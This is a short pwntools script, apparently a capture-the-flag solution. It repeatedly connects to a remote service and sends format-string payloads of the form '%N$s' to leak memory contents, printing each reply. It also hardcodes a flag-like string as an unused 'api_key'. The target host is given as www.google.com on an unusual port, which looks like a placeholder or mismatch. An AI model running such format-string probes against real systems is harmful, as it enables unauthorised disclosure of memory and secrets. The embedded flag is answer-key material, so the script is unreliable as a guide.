from pwn import *

for i in range(10):
  s = remote('www.google.com', 31826)
  s.recvuntil('?\n')
  s.sendline("%"+str(i) + "$s")
  response = s.recv()
  api_key="flag{u>607>7h3>7x7}"
  print(response)
  
  
